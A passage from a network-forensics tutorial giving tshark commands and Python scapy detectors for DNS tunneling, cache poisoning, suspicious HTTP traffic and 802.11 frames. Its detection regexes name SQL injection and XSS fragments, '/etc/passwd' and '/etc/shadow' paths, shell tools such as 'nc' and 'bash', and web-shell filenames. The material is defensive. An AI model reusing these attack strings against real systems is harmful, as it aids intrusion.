  -T fields -e dns.txt | \
  awk '{if(length($0)>100) print length($0), $0}' | \
  sort -rn
```

**Python DNS Tunneling Detector:**

```python
#!/usr/bin/env python3
from scapy.all import *
from collections import defaultdict
import re
import base64

class DNSTunnelingDetector:
    def __init__(self, pcap_file):
        self.packets = rdpcap(pcap_file)
        self.domain_queries = defaultdict(list)
        self.suspicious_domains = []
    
    def analyze(self):
        """Run all DNS tunneling detection methods"""
        self.extract_queries()
        self.detect_high_query_volume()
        self.detect_long_subdomains()
        self.detect_high_entropy_subdomains()
        self.detect_txt_record_abuse()
        return self.suspicious_domains
    
    def extract_queries(self):
        """Extract all DNS queries"""
        for pkt in self.packets:
            if pkt.haslayer('DNS') and pkt.getlayer('DNS').qd:
                qname = pkt.getlayer('DNS').qd.qname.decode('utf-8', errors='ignore').rstrip('.')
                src_ip = pkt['IP'].src if pkt.haslayer('IP') else 'unknown'
                self.domain_queries[qname].append(src_ip)
    
    def detect_high_query_volume(self, threshold=50):
        """Detect domains with excessive queries"""
        for domain, sources in self.domain_queries.items():
            if len(sources) > threshold:
                self.suspicious_domains.append({
                    'type': 'High Query Volume',
                    'domain': domain,
                    'query_count': len(sources),
                    'unique_sources': len(set(sources))
                })
    
    def detect_long_subdomains(self, length_threshold=30):
        """Detect unusually long subdomains"""
        for domain in self.domain_queries.keys():
            subdomain = domain.split('.')[0]
            if len(subdomain) > length_threshold:
                self.suspicious_domains.append({
                    'type': 'Long Subdomain',
                    'domain': domain,
                    'subdomain_length': len(subdomain)
                })
    
    def detect_high_entropy_subdomains(self, entropy_threshold=3.5):
        """Detect high-entropy subdomains"""
        import math
        
        def entropy(string):
            from collections import Counter
            if not string:
                return 0
            counter = Counter(string)
            length = len(string)
            return -sum((count/length) * math.log2(count/length) 
                       for count in counter.values())
        
        for domain in self.domain_queries.keys():
            subdomain = domain.split('.')[0]
            if len(subdomain) > 10:
                ent = entropy(subdomain)
                if ent > entropy_threshold:
                    self.suspicious_domains.append({
                        'type': 'High Entropy Subdomain',
                        'domain': domain,
                        'entropy': ent
                    })
    
    def detect_txt_record_abuse(self):
        """Detect TXT record tunneling"""
        for pkt in self.packets:
            if pkt.haslayer('DNS'):
                dns = pkt.getlayer('DNS')
                
                # Check for TXT queries
                if dns.qd and dns.qd.qtype == 16:  # TXT record
                    qname = dns.qd.qname.decode('utf-8', errors='ignore')
                    self.suspicious_domains.append({
                        'type': 'TXT Record Query',
                        'domain': qname
                    })
                
                # Check TXT responses
                if dns.an:
                    for i in range(dns.ancount):
                        if dns.an[i].type == 16:  # TXT record
                            txt_data = dns.an[i].rdata
                            if len(txt_data) > 50:
                                self.suspicious_domains.append({
                                    'type': 'Large TXT Response',
                                    'domain': dns.an[i].rrname.decode(),
                                    'data_length': len(txt_data)
                                })

# Usage
detector = DNSTunnelingDetector('capture.pcap')
findings = detector.analyze()

for finding in findings:
    print(f"[!] {finding['type']}")
    for key, value in finding.items():
        if key != 'type':
            print(f"    {key}: {value}")
```

### NXDOMAIN Analysis

**Failed DNS Query Detection:**

```bash
# Count NXDOMAIN responses
tshark -r capture.pcap -Y "dns.flags.rcode == 3" \
  -T fields -e dns.qry.name | sort | uniq -c | sort -rn

# Find sources generating NXDOMAIN
tshark -r capture.pcap -Y "dns.flags.rcode == 3" \
  -T fields -e ip.src -e dns.qry.name | \
  awk '{count[$1]++} END {for(ip in count) print ip, count[ip]}' | \
  sort -k2 -rn
```

**Fast Flux Detection:**

```bash
# Detect domains with frequently changing IPs
tshark -r capture.pcap -Y "dns.a" \
  -T fields -e dns.qry.name -e dns.a | \
  awk '{ips[$1]=ips[$1]","$2; count[$1]++} END {for(d in ips) if(count[d]>5) print d, count[d], ips[d]}'

# Short TTL detection
tshark -r capture.pcap -Y "dns.resp.ttl" \
  -T fields -e dns.qry.name -e dns.resp.ttl | \
  awk '$2 < 300 {print}'
```

### DNS Query Type Anomalies

**Unusual Query Types:**

```bash
# List all query types
tshark -r capture.pcap -Y "dns" \
  -T fields -e dns.qry.type | sort | uniq -c

# Filter specific types
# 1=A, 2=NS, 5=CNAME, 6=SOA, 12=PTR, 15=MX, 16=TXT, 28=AAAA, 33=SRV

# Detect rare types (potential covert channels)
tshark -r capture.pcap -Y "dns.qry.type > 33" \
  -T fields -e ip.src -e dns.qry.name -e dns.qry.type
```

**NULL Record Queries:**

```bash
# Detect NULL (type 10) queries
tshark -r capture.pcap -Y "dns.qry.type == 10" \
  -T fields -e ip.src -e dns.qry.name
```

### Suspicious DNS Servers

**Identify Used DNS Servers:**

```bash
# List all DNS servers queried
tshark -r capture.pcap -Y "dns" \
  -T fields -e ip.dst -e udp.dstport | \
  awk '$2 == 53 {print $1}' | sort -u

# Check for non-standard DNS servers
tshark -r capture.pcap -Y "dns && ip.dst != 8.8.8.8 && ip.dst != 8.8.4.4" \
  -T fields -e ip.dst | sort -u
```

**DNS Over Non-Standard Ports:**

```bash
# Detect DNS on non-53 ports
tshark -r capture.pcap -Y "dns && udp.port != 53 && tcp.port != 53"  
-T fields -e ip.src -e ip.dst -e udp.port -e tcp.port
````

### DNS Response Anomalies

**Multiple A Records (Fast Flux):**
```bash
# Domains returning multiple IPs
tshark -r capture.pcap -Y "dns.count.answers > 5" \
  -T fields -e dns.qry.name -e dns.count.answers -e dns.a

# Rapid IP changes for same domain
tshark -r capture.pcap -Y "dns.a" \
  -T fields -e frame.time -e dns.qry.name -e dns.a | \
  sort -k2
````

**Geographical Anomalies:**

```python
#!/usr/bin/env python3
import requests
from collections import defaultdict

def check_ip_geolocation(ip):
    """
    Check IP geolocation
    [Inference] Requires external API - actual implementation depends on service used
    """
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                'country': data.get('country', 'Unknown'),
                'city': data.get('city', 'Unknown'),
                'isp': data.get('isp', 'Unknown')
            }
    except:
        pass
    return None

def analyze_dns_geolocation(pcap_file):
    """Detect DNS responses pointing to suspicious locations"""
    from scapy.all import rdpcap
    
    packets = rdpcap(pcap_file)
    domain_ips = defaultdict(list)
    
    for pkt in packets:
        if pkt.haslayer('DNS') and pkt.getlayer('DNS').an:
            dns = pkt.getlayer('DNS')
            qname = dns.qd.qname.decode('utf-8', errors='ignore') if dns.qd else ''
            
            for i in range(dns.ancount):
                if dns.an[i].type == 1:  # A record
                    ip = dns.an[i].rdata
                    domain_ips[qname].append(ip)
    
    # Check for domains resolving to multiple countries
    for domain, ips in domain_ips.items():
        if len(ips) > 3:
            countries = set()
            for ip in ips[:5]:  # Check first 5 IPs
                geo = check_ip_geolocation(ip)
                if geo:
                    countries.add(geo['country'])
            
            if len(countries) > 2:
                print(f"[!] Domain {domain} resolves to multiple countries: {countries}")
```

### DNS Cache Poisoning Detection

**Detect Suspicious DNS Responses:**

```bash
# Multiple responses to same query ID
tshark -r capture.pcap -Y "dns.flags.response == 1" \
  -T fields -e dns.id -e ip.src -e dns.a | \
  awk '{id_count[$1]++; data[$1]=data[$1]"\n"$0} END {for(id in id_count) if(id_count[id]>1) print "ID "id" has "id_count[id]" responses:"data[id]}'

# Unsolicited DNS responses (no matching query)
# [Inference] Requires correlation of queries and responses by transaction ID
```

**Transaction ID Analysis:**

```python
#!/usr/bin/env python3
from scapy.all import *
from collections import defaultdict

def detect_dns_poisoning(pcap_file):
    """Detect potential DNS cache poisoning attempts"""
    packets = rdpcap(pcap_file)
    
    queries = {}  # txid -> (src_ip, query_name, timestamp)
    responses = defaultdict(list)  # txid -> [(src_ip, answer, timestamp)]
    
    for pkt in packets:
        if pkt.haslayer('DNS'):
            dns = pkt.getlayer('DNS')
            txid = dns.id
            
            if dns.qr == 0:  # Query
                if dns.qd:
                    qname = dns.qd.qname.decode('utf-8', errors='ignore')
                    queries[txid] = (pkt['IP'].src, qname, float(pkt.time))
            
            elif dns.qr == 1:  # Response
                answers = []
                if dns.an:
                    for i in range(dns.ancount):
                        if dns.an[i].type == 1:  # A record
                            answers.append(dns.an[i].rdata)
                
                responses[txid].append((pkt['IP'].src, answers, float(pkt.time)))
    
    # Detect anomalies
    suspicious = []
    
    for txid, resp_list in responses.items():
        if len(resp_list) > 1:
            # Multiple responses for same transaction ID
            unique_sources = set(r[0] for r in resp_list)
            unique_answers = set(str(r[1]) for r in resp_list)
            
            if len(unique_answers) > 1:
                suspicious.append({
                    'type': 'Multiple Different Responses',
                    'txid': txid,
                    'query': queries.get(txid, ('unknown', 'unknown', 0))[1],
                    'response_count': len(resp_list),
                    'unique_sources': list(unique_sources),
                    'conflicting_answers': list(unique_answers)
                })
    
    return suspicious

# Usage
findings = detect_dns_poisoning('capture.pcap')
for finding in findings:
    print(f"[!] {finding['type']}")
    print(f"    Transaction ID: {finding['txid']}")
    print(f"    Query: {finding['query']}")
    print(f"    Conflicting answers: {finding['conflicting_answers']}")
```

## HTTP Anomalies

### Suspicious User-Agent Analysis

**Uncommon User Agents:**

```bash
# Extract all user agents
tshark -r capture.pcap -Y "http.user_agent" \
  -T fields -e http.user_agent | sort | uniq -c | sort -rn

# Filter scripting/automation tools
tshark -r capture.pcap -Y "http.user_agent" \
  -T fields -e http.user_agent | \
  grep -iE "(python|curl|wget|powershell|nikto|sqlmap|nmap|metasploit|bot|crawler|scanner)"

# Empty or missing user agents
tshark -r capture.pcap -Y "http.request && !http.user_agent" \
  -T fields -e ip.src -e http.host -e http.request.uri
```

**User-Agent Anomaly Detection:**

```python
#!/usr/bin/env python3
from collections import defaultdict
import re

def analyze_user_agents(pcap_file):
    """Detect suspicious user agent patterns"""
    from scapy.all import rdpcap
    
    packets = rdpcap(pcap_file)
    user_agents = defaultdict(int)
    suspicious = []
    
    # Known malicious/suspicious patterns
    suspicious_patterns = [
        (r'python-requests', 'Python Automation'),
        (r'^curl/', 'cURL Tool'),
        (r'^wget/', 'Wget Tool'),
        (r'powershell', 'PowerShell'),
        (r'sqlmap', 'SQL Injection Tool'),
        (r'nikto', 'Web Scanner'),
        (r'nmap', 'Network Scanner'),
        (r'masscan', 'Port Scanner'),
        (r'zgrab', 'Banner Grabber'),
        (r'^Mozilla/4\.0$', 'Outdated Browser (Potential Bot)'),
        (r'^Mozilla/5\.0 \(compatible\)$', 'Generic Bot UA'),
        (r'bot|crawler|spider', 'Bot/Crawler'),
        (r'^$', 'Empty User-Agent')
    ]
    
    for pkt in packets:
        if pkt.haslayer('HTTP'):
            http_layer = pkt.getlayer('HTTP')
            if hasattr(http_layer, 'User_Agent'):
                ua = http_layer.User_Agent.decode('utf-8', errors='ignore')
                user_agents[ua] += 1
                
                src_ip = pkt['IP'].src if pkt.haslayer('IP') else 'unknown'
                
                for pattern, description in suspicious_patterns:
                    if re.search(pattern, ua, re.IGNORECASE):
                        suspicious.append({
                            'src_ip': src_ip,
                            'user_agent': ua,
                            'reason': description
                        })
                        break
    
    return suspicious, user_agents

# Usage
suspicious, all_uas = analyze_user_agents('capture.pcap')

print("[!] Suspicious User Agents:")
for item in suspicious:
    print(f"  {item['src_ip']} - {item['reason']}")
    print(f"    UA: {item['user_agent'][:80]}")
```

**User-Agent Inconsistency Detection:**

```python
def detect_ua_inconsistencies(pcap_file):
    """Detect when single IP uses multiple incompatible user agents"""
    from scapy.all import rdpcap
    from collections import defaultdict
    
    packets = rdpcap(pcap_file)
    ip_user_agents = defaultdict(set)
    
    for pkt in packets:
        if pkt.haslayer('HTTP') and pkt.haslayer('IP'):
            http_layer = pkt.getlayer('HTTP')
            if hasattr(http_layer, 'User_Agent'):
                ua = http_layer.User_Agent.decode('utf-8', errors='ignore')
                src_ip = pkt['IP'].src
                ip_user_agents[src_ip].add(ua)
    
    # Detect IPs with multiple distinct user agents
    inconsistent = []
    for ip, uas in ip_user_agents.items():
        if len(uas) > 3:  # More than 3 different UAs from same IP
            inconsistent.append({
                'ip': ip,
                'user_agent_count': len(uas),
                'user_agents': list(uas)[:5]  # Show first 5
            })
    
    return inconsistent
```

### HTTP Method Anomalies

**Unusual HTTP Methods:**

```bash
# Count HTTP methods
tshark -r capture.pcap -Y "http.request.method" \
  -T fields -e http.request.method | sort | uniq -c

# Detect dangerous methods
tshark -r capture.pcap -Y "http.request.method" \
  -T fields -e http.request.method -e ip.src -e http.host | \
  grep -E "(PUT|DELETE|TRACE|CONNECT|OPTIONS)"

# PROPFIND/WebDAV methods (potential scanning)
tshark -r capture.pcap -Y "http.request.method" \
  -T fields -e http.request.method -e http.request.uri | \
  grep -E "(PROPFIND|PROPPATCH|MKCOL|COPY|MOVE|LOCK|UNLOCK)"
```

### URI Path Anomalies

**SQL Injection Attempts:**

```bash
# Detect SQL injection patterns in URIs
tshark -r capture.pcap -Y "http.request.uri" \
  -T fields -e ip.src -e http.host -e http.request.uri | \
  grep -iE "(union.*select|'.*or.*'|1=1|admin'--|exec\(|drop.*table)"

# Encoded SQL injection attempts
tshark -r capture.pcap -Y "http.request.uri" \
  -T fields -e http.request.uri | \
  grep -iE "(%27|%20or%20|%3D|union%20select)"
```

**Directory Traversal Attempts:**

```bash
# Path traversal patterns
tshark -r capture.pcap -Y "http.request.uri" \
  -T fields -e ip.src -e http.request.uri | \
  grep -E "(\.\.\/|\.\.\\|%2e%2e%2f|%2e%2e%5c)"

# Absolute path attempts (Linux/Windows)
tshark -r capture.pcap -Y "http.request.uri" \
  -T fields -e http.request.uri | \
  grep -E "(\/etc\/passwd|\/etc\/shadow|c:\\|\\\\windows\\\\)"
```

**Command Injection Patterns:**

```bash
# Shell command injection
tshark -r capture.pcap -Y "http.request.uri" \
  -T fields -e ip.src -e http.request.uri | \
  grep -iE "(\||;|`|\$\(|&&|nc\s|bash|cmd\.exe|powershell)"

# URL-encoded command injection
tshark -r capture.pcap -Y "http.request.uri" \
  -T fields -e http.request.uri | \
  grep -iE "(%7c|%3B|%26%26|%24%28)"
```

**Web Shell Upload Attempts:**

```bash
# Common web shell filenames in URIs
tshark -r capture.pcap -Y "http.request.uri" \
  -T fields -e ip.src -e http.request.uri | \
  grep -iE "(shell\.php|cmd\.jsp|backdoor\.aspx|r57\.php|c99\.php|webshell)"

# Suspicious file extensions in POST
tshark -r capture.pcap -Y "http.request.method == POST" \
  -T fields -e http.request.uri | \
  grep -iE "\.(php|jsp|asp|aspx|exe|sh|pl|py)\?"
```

**Scanner/Tool Signatures in URIs:**

```bash
# Common vulnerability scanner paths
tshark -r capture.pcap -Y "http.request.uri" \
  -T fields -e ip.src -e http.request.uri | \
  grep -iE "(admin|phpmyadmin|wp-admin|cpanel|manager\/html|\/solr\/|\.git\/|\.env)"

# WordPress scanning
tshark -r capture.pcap -Y "http.request.uri" \
  -T fields -e http.request.uri | \
  grep -E "(wp-login|wp-admin|xmlrpc\.php|wp-content\/plugins)"
```

### HTTP Response Code Analysis

**Error Rate Analysis:**

```bash
# Count response codes
tshark -r capture.pcap -Y "http.response.code" \
  -T fields -e http.response.code | sort | uniq -c | sort -rn

# High 4xx error rates (scanning/probing)
tshark -r capture.pcap -Y "http.response.code >= 400 && http.response.code < 500" \
  -T fields -e ip.dst -e http.response.code -e http.request.uri | \
  awk '{count[$1]++} END {for(ip in count) if(count[ip]>20) print ip, count[ip]}'

# 5xx errors (potential attacks causing server issues)
tshark -r capture.pcap -Y "http.response.code >= 500" \
  -T fields -e frame.time -e ip.src -e http.response.code -e http.request.uri
```

**Successful Access After Failures (Brute Force Success):**

```bash
# Track 401/403 followed by 200 from same IP
tshark -r capture.pcap -Y "http.response.code" \
  -T fields -e frame.time -e ip.dst -e http.response.code -e http.request.uri | \
  sort -k2
```

### POST Data Analysis

**Large POST Requests:**

```bash
# Detect large POST bodies (potential upload/exfiltration)
tshark -r capture.pcap -Y "http.request.method == POST" \
  -T fields -e ip.src -e http.content_length -e http.request.uri | \
  awk '$2 > 1000000 {print}'  # > 1MB

# Extract POST data
tshark -r capture.pcap -Y "http.request.method == POST" \
  -T fields -e http.file_data | head -20
```

**Encoded/Suspicious POST Data:**

```bash
# Base64 in POST data
tshark -r capture.pcap -Y "http.request.method == POST" \
  -T fields -e ip.src -e http.file_data | \
  grep -E "^[A-Za-z0-9+/]{50,}={0,2}$"

# Hex-encoded data
tshark -r capture.pcap -Y "http.request.method == POST" \
  -T fields -e http.file_data | \
  grep -E "^(0x)?[0-9a-fA-F]{40,}$"

# Serialized objects (potential deserialization attacks)
tshark -r capture.pcap -Y "http.request.method == POST" \
  -T fields -e http.file_data | \
  grep -iE "(rO0|aced0005|serialized|pickle)"
```

### Header Anomalies

**Missing Standard Headers:**

```bash
# Requests without Host header
tshark -r capture.pcap -Y "http.request && !http.host" \
  -T fields -e ip.src -e http.request.uri

# Requests without Accept headers
tshark -r capture.pcap -Y "http.request && !http.accept" \
  -T fields -e ip.src -e http.request.uri
```

**Suspicious Header Values:**

```bash
# X-Forwarded-For header spoofing attempts
tshark -r capture.pcap -Y "http.x_forwarded_for" \
  -T fields -e ip.src -e http.x_forwarded_for

# Referer anomalies (internal URL in referer from external source)
tshark -r capture.pcap -Y "http.referer" \
  -T fields -e ip.src -e http.referer -e http.host

# Custom/unusual headers
tshark -r capture.pcap -Y "http" -V | \
  grep -E "^\s+[A-Z][a-z-]+:" | sort -u
```

### Content-Type Mismatches

**Detect Type Confusion:**

```bash
# POST without Content-Type
tshark -r capture.pcap -Y "http.request.method == POST && !http.content_type" \
  -T fields -e ip.src -e http.request.uri

# Executable disguised as image
tshark -r capture.pcap -Y "http.content_type contains \"image\"" \
  --export-objects http,./exports/

# Check exported files
for f in exports/*; do
    file "$f" | grep -v "image data" && echo "Mismatch: $f"
done
```

### HTTP Tunneling Detection

**CONNECT Method Usage:**

```bash
# Detect HTTP CONNECT (proxy tunneling)
tshark -r capture.pcap -Y "http.request.method == CONNECT" \
  -T fields -e ip.src -e http.request.uri

# Unusual CONNECT destinations
tshark -r capture.pcap -Y "http.request.method == CONNECT" \
  -T fields -e http.request.uri | \
  awk -F: '{if($2 != 443 && $2 != 80) print}'
```

**Long-lived HTTP Connections:**

```bash
# Detect HTTP connections with long duration
tshark -r capture.pcap -Y "http" -T fields -e tcp.stream | sort -u | \
while read stream; do
    duration=$(tshark -r capture.pcap -Y "tcp.stream == $stream" \
      -T fields -e frame.time_relative | tail -1)
    echo "$stream $duration"
done | awk '$2 > 300 {print}'  # > 5 minutes
```

### Automated HTTP Anomaly Detector

```python
#!/usr/bin/env python3
from scapy.all import *
from collections import defaultdict
import re
from urllib.parse import unquote

class HTTPAnomalyDetector:
    def __init__(self, pcap_file):
        self.packets = rdpcap(pcap_file)
        self.anomalies = []
    
    def analyze(self):
        """Run all HTTP anomaly detection methods"""
        self.detect_sql_injection()
        self.detect_xss()
        self.detect_path_traversal()
        self.detect_command_injection()
        self.detect_scanner_activity()
        self.detect_unusual_methods()
        return self.anomalies
    
    def detect_sql_injection(self):
        """Detect SQL injection attempts"""
        sqli_patterns = [
            r"('|\").*or.*('|\")",
            r"union.*select",
            r"exec\s*\(",
            r"drop\s+table",
            r"';.*--",
            r"1\s*=\s*1",
            r"admin'\s*--",
            r"or\s+1\s*=\s*1"
        ]
        
        for pkt in self.packets:
            if pkt.haslayer('HTTP') and pkt.haslayer('HTTPRequest'):
                http = pkt['HTTPRequest']
                uri = http.Path.decode('utf-8', errors='ignore')
                uri_decoded = unquote(uri)
                
                for pattern in sqli_patterns:
                    if re.search(pattern, uri_decoded, re.IGNORECASE):
                        self.anomalies.append({
                            'type': 'SQL Injection Attempt',
                            'src_ip': pkt['IP'].src,
                            'uri': uri[:100],
                            'pattern': pattern
                        })
                        break
    
    def detect_xss(self):
        """Detect XSS attempts"""
        xss_patterns = [
            r'<script',
            r'javascript:',
            r'onerror\s*=',
            r'onload\s*=',
            r'<img.*src',
            r'eval\s*\(',
            r'alert\s*\('
        ]
        
        for pkt in self.packets:
            if pkt.haslayer('HTTP') and pkt.haslayer('HTTPRequest'):
                http = pkt['HTTPRequest']
                uri = http.Path.decode('utf-8', errors='ignore')
                uri_decoded = unquote(uri)
                
                for pattern in xss_patterns:
                    if re.search(pattern, uri_decoded, re.IGNORECASE):
                        self.anomalies.append({
                            'type': 'XSS Attempt',
                            'src_ip': pkt['IP'].src,
                            'uri': uri[:100],
                            'pattern': pattern
                        })
                        break
    
    def detect_path_traversal(self):
        """Detect directory traversal attempts"""
        traversal_patterns = [
            r'\.\.[/\\]',
            r'%2e%2e[/\\]',
            r'/etc/passwd',
            r'/etc/shadow',
            r'c:[/\\]',
            r'\\windows\\',
            r'/root/',
            r'/home/'
        ]
        
        for pkt in self.packets:
            if pkt.haslayer('HTTP') and pkt.haslayer('HTTPRequest'):
                http = pkt['HTTPRequest']
                uri = http.Path.decode('utf-8', errors='ignore')
                uri_decoded = unquote(uri).lower()
                
                for pattern in traversal_patterns:
                    if re.search(pattern, uri_decoded, re.IGNORECASE):
                        self.anomalies.append({
                            'type': 'Path Traversal Attempt',
                            'src_ip': pkt['IP'].src,
                            'uri': uri[:100]
                        })
                        break
    
    def detect_command_injection(self):
        """Detect command injection attempts"""
        cmd_patterns = [
            r'[|;&`]',
            r'\$\(',
            r'&&',
            r'\|\|',
            r'nc\s',
            r'bash\s',
            r'sh\s',
            r'cmd\.exe',
            r'powershell'
        ]
        
        for pkt in self.packets:
            if pkt.haslayer('HTTP') and pkt.haslayer('HTTPRequest'):
                http = pkt['HTTPRequest']
                uri = http.Path.decode('utf-8', errors='ignore')
                uri_decoded = unquote(uri)
                
                for pattern in cmd_patterns:
                    if re.search(pattern, uri_decoded, re.IGNORECASE):
                        self.anomalies.append({
                            'type': 'Command Injection Attempt',
                            'src_ip': pkt['IP'].src,
                            'uri': uri[:100],
                            'pattern': pattern
                        })
                        break
    
    def detect_scanner_activity(self):
        """Detect vulnerability scanning"""
        scanner_paths = [
            r'/admin',
            r'/phpmyadmin',
            r'/wp-admin',
            r'/\.git/',
            r'/\.env',
            r'/config',
            r'/backup',
            r'/\.svn/',
            r'/manager/html',
            r'/console'
        ]
        
        ip_path_count = defaultdict(set)
        
        for pkt in self.packets:
            if pkt.haslayer('HTTP') and pkt.haslayer('HTTPRequest'):
                http = pkt['HTTPRequest']
                uri = http.Path.decode('utf-8', errors='ignore')
                src_ip = pkt['IP'].src
                
                for pattern in scanner_paths:
                    if re.search(pattern, uri, re.IGNORECASE):
                        ip_path_count[src_ip].add(uri)
        
        # Flag IPs accessing multiple scanner-related paths
        for ip, paths in ip_path_count.items():
            if len(paths) >= 3:
                self.anomalies.append({
                    'type': 'Scanner Activity',
                    'src_ip': ip,
                    'scanned_paths': len(paths),
                    'sample_paths': list(paths)[:5]
                })
    
    def detect_unusual_methods(self):
        """Detect unusual HTTP methods"""
        unusual_methods = ['PUT', 'DELETE', 'TRACE', 'CONNECT', 'OPTIONS', 
                          'PROPFIND', 'PROPPATCH', 'MKCOL', 'COPY', 'MOVE']
        
        for pkt in self.packets:
            if pkt.haslayer('HTTP') and pkt.haslayer('HTTPRequest'):
                http = pkt['HTTPRequest']
                method = http.Method.decode('utf-8', errors='ignore')
                
                if method in unusual_methods:
                    self.anomalies.append({
                        'type': 'Unusual HTTP Method',
                        'src_ip': pkt['IP'].src,
                        'method': method,
                        'uri': http.Path.decode('utf-8', errors='ignore')[:100]
                    })

# Usage
detector = HTTPAnomalyDetector('capture.pcap')
anomalies = detector.analyze()

# Group by type
from collections import defaultdict
by_type = defaultdict(list)
for anomaly in anomalies:
    by_type[anomaly['type']].append(anomaly)

for anomaly_type, items in by_type.items():
    print(f"\n[!] {anomaly_type}: {len(items)} instances")
    for item in items[:5]:  # Show first 5
        print(f"    {item['src_ip']}")
        if 'uri' in item:
            print(f"      URI: {item['uri']}")
```

---

## Related Topics for Further Study

- **Machine Learning for Anomaly Detection** - Training models on network traffic patterns
- **YARA Rules for Network Traffic** - Pattern matching for malware signatures
- **Advanced Persistent Threat (APT) Detection** - Long-term compromise indicators
- **Lateral Movement Detection** - Identifying post-compromise activity
- **Data Loss Prevention (DLP)** - Detecting sensitive data exfiltration

---

# Wireless Traffic Analysis

## 802.11 Frame Types

### Frame Structure and Classification

**Three Primary Frame Categories:**

1. **Management Frames (Type 0)** - Network administration and association
2. **Control Frames (Type 1)** - Medium access and acknowledgment
3. **Data Frames (Type 2)** - Actual data transmission

**Frame Format Structure:**

```
┌────────────┬─────────┬──────────┬──────────┬──────────┬──────────┬─────┬─────┐
│Frame Control│Duration │Address 1 │Address 2 │Address 3 │Sequence  │Addr4│ FCS │
│   2 bytes  │ 2 bytes │ 6 bytes  │ 6 bytes  │ 6 bytes  │  2 bytes │6 B  │4 B  │
└────────────┴─────────┴──────────┴──────────┴──────────┴──────────┴─────┴─────┘
```

### Management Frames (Type 0)

**Beacon Frames (Subtype 8):**

```bash
# Capture beacon frames only
tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x08"

# Extract SSID from beacons
tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x08" \
  -T fields -e wlan.ssid -e wlan.bssid

# Display beacon interval and capabilities
tshark -r capture.cap -Y "wlan.fc.type_subtype == 0x08" \
  -T fields -e wlan.bssid -e wlan.ssid -e wlan.beacon_interval \
  -e wlan.capabilities

# Extract supported rates
tshark -r capture.cap -Y "wlan.fc.type_subtype == 0x08" \
  -T fields -e wlan.bssid -e wlan.supported_rates
```

**Probe Request/Response (Subtypes 4/5):**

```bash
# Capture probe requests (devices searching for networks)
tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x04" \
  -T fields -e wlan.sa -e wlan.ssid

# Capture probe responses (AP advertising capabilities)
tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x05" \
  -T fields -e wlan.bssid -e wlan.ssid

# Identify hidden SSIDs via probe requests
tshark -r capture.cap -Y "wlan.fc.type_subtype == 0x04 and wlan.ssid" \
  -T fields -e wlan.ssid | sort -u

# Track device movement patterns
tshark -r capture.cap -Y "wlan.fc.type_subtype == 0x04" \
  -T fields -e frame.time -e wlan.sa -e wlan.ssid
```

**Authentication Frames (Subtype 11):**

```bash
# Capture authentication attempts
tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x0b"

# Identify authentication algorithm (0=Open, 1=Shared Key, 2=Fast BSS)
tshark -r capture.cap -Y "wlan.fc.type_subtype == 0x0b" \
  -T fields -e wlan.sa -e wlan.da -e wlan.auth.alg

# Monitor authentication sequence numbers
tshark -r capture.cap -Y "wlan.fc.type_subtype == 0x0b" \
  -T fields -e wlan.sa -e wlan.auth.alg -e wlan.auth.seq

# Detect failed authentications
tshark -r capture.cap -Y "wlan.fc.type_subtype == 0x0b and wlan.auth.status_code != 0" \
  -T fields -e wlan.sa -e wlan.auth.status_code
```

**Association Request/Response (Subtypes 0/1):**

```bash
# Capture association requests
tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x00" \
  -T fields -e wlan.sa -e wlan.bssid

# Extract client capabilities from association requests
tshark -r capture.cap -Y "wlan.fc.type_subtype == 0x00" \
  -T fields -e wlan.sa -e wlan.capabilities -e wlan.supported_rates

# Monitor association responses
tshark -r capture.cap -Y "wlan.fc.type_subtype == 0x01" \
  -T fields -e wlan.bssid -e wlan.da -e wlan.assoc.status_code

# Identify successful associations
tshark -r capture.cap -Y "wlan.fc.type_subtype == 0x01 and wlan.assoc.status_code == 0"
```

**Deauthentication Frames (Subtype 12):**

```bash
# Capture deauth packets
tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x0c"

# Extract deauth reason codes
tshark -r capture.cap -Y "wlan.fc.type_subtype == 0x0c" \
  -T fields -e wlan.sa -e wlan.da -e wlan.reason_code

# Detect deauth attacks (high volume from single source)
tshark -r capture.cap -Y "wlan.fc.type_subtype == 0x0c" \
  -T fields -e wlan.sa | sort | uniq -c | sort -rn

# Common reason codes:
# 1 = Unspecified
# 2 = Previous authentication no longer valid
# 3 = Deauthenticated because sending STA is leaving
# 4 = Inactivity timer expired
# 6 = Class 2 frame from non-authenticated STA
# 7 = Class 3 frame from non-associated STA
```

**Disassociation Frames (Subtype 10):**

```bash
# Capture disassociation frames
tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x0a" \
  -T fields -e wlan.sa -e wlan.da -e wlan.reason_code
```

### Control Frames (Type 1)

**RTS (Request to Send - Subtype 11):**

```bash
# Capture RTS frames
tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x1b" \
  -T fields -e wlan.ra -e wlan.ta -e wlan.duration
```

**CTS (Clear to Send - Subtype 12):**

```bash
# Capture CTS frames
tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x1c" \
  -T fields -e wlan.ra -e wlan.duration
```

**ACK (Acknowledgment - Subtype 13):**

```bash
# Capture ACK frames
tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x1d"

# Analyze ACK patterns for channel quality assessment
tshark -r capture.cap -Y "wlan.fc.type_subtype == 0x1d" | wc -l
```

### Data Frames (Type 2)

**Standard Data Frames (Subtype 0):**

```bash
# Capture data frames
tshark -i wlan0mon -Y "wlan.fc.type == 2"

# Extract data frame addresses
tshark -r capture.cap -Y "wlan.fc.type == 2" \
  -T fields -e wlan.sa -e wlan.da -e wlan.bssid

# Identify encrypted data frames
tshark -r capture.cap -Y "wlan.fc.type == 2 and wlan.fc.protected == 1"
```

**QoS Data Frames (Subtype 8):**

```bash
# Capture QoS data frames
tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x28"

# Extract QoS priority
tshark -r capture.cap -Y "wlan.qos" \
  -T fields -e wlan.sa -e wlan.qos.priority
```

**Null Function Frames (Subtype 4):**

```bash
# Capture null frames (power management)
tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x24"

# Identify power save mode transitions
tshark -r capture.cap -Y "wlan.fc.type_subtype == 0x24" \
  -T fields -e wlan.sa -e wlan.fc.pwrmgt
```

